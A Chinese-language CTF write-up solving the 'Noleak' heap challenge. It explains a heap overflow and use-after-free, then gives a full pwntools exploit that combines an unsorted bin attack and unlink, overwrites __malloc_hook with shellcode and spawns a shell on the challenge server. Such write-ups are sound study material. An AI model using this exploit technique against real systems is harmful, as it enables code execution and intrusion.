# Noleak


# 涉及知识

+ Unsorted bin attack
+ Unlink
+ 利用泄漏的Unsorted地址获得__malloc_hook

<!--more-->

# 程序分析

## 保护机制

![image.png](https://i.loli.net/2020/05/20/4sQo39lPABKkTeU.png)

RELRO保护全开启，plt，got表等没有写权限，但是NX保护没有开启，可以自己写shellcode。

## 漏洞分析

![image.png](https://i.loli.net/2020/05/20/Ne3x4u6OQVoJLd9.png)

在update函数中，程序没有对读入字节做限制，存在堆溢出。

![image.png](https://i.loli.net/2020/05/20/UMDr42iglFPZfB8.png)

在delete函数中，free后没有对指针清零。UAF，Double free，Unsorted攻击等都可以使用。

## 思路

由于程序RELRO全开启，无法泄漏libc地址，就如题目一样，No leak。但是可以利用Unsorted攻击，将Unsorted的地址attack到储存指针的变量上。Unsorted的地址低8位修改为\x10后，刚好为__malloc_hook的地址。我们在将__malloc_hook的值修改为我们的shellcode。

*__malloc_hook的工作原理和__free_hook类似。在默认情况下__malloc_hook值为null，当malloc函数调用时，会先判断__malloc_hook是否为空，如果不为空，就会执行__malloc_hook指向的函数*

如何修改Unsorted的低8位呢？在这里有几种办法，可以使用Unlink attack，也可以使用fastbin attack。

# EXP

````python
from pwn import *

context.arch='amd64'
context.os='linux'
#sh=process('./timu')
sh=remote('111.198.29.45',40228)
elf=ELF('./timu')
def create(size,data):
	sh.recvuntil(':')
	sh.sendline('1')
	sh.recvuntil(':')
	sh.sendline(str(size))
	sh.recvuntil(':')
	sh.sendline(data)

def delete(index):
	sh.recvuntil(':')
	sh.sendline('2')
	sh.recvuntil(':')
	sh.sendline(str(index))

def update(index,size,data):
	sh.recvuntil(':')
	sh.sendline('3')
	sh.recvuntil(':')
	sh.sendline(str(index))
	sh.recvuntil(':')
	sh.sendline(str(size))
	sh.recvuntil(':')
	sh.send(data)

#create
create(0x90,'aaa') #0
create(0x90,'bbb') #1
create(0x90,'ccc') #2

#unsorted attack
delete(0)
unsorted_addr=0x601050
payload='a'*8+p64(unsorted_addr)
update(0,0x90,payload)
create(0x90,'aaa') #3

#unlink attach
#fake chunck
aim=0x601048
payload='a'*8+p64(0x91)+p64(aim-0x18)+p64(aim-0x10)+'a'*0x70+p64(0x90)+p64(0xa0)
update(1,0xa0,payload)
delete(2)

#eidit unsorted
shell=0x601030
update(1,0xa0,asm(shellcraft.sh())+'\x10')
update(4,0x8,p64(shell))
sh.recvuntil(':')
sh.sendline('1')
sh.recvuntil(':')
sh.sendline('2')
sh.interactive() 
````

# 反思

+ 堆利用多种技术结合会碰撞出不一样的火花

+ Unsorted变量和__malloc_hook这样的变量储存的位置较近

## 参考

[Unsorted + Fastbin](https://wanghaichen.com/index.php/archives/noleak.html)
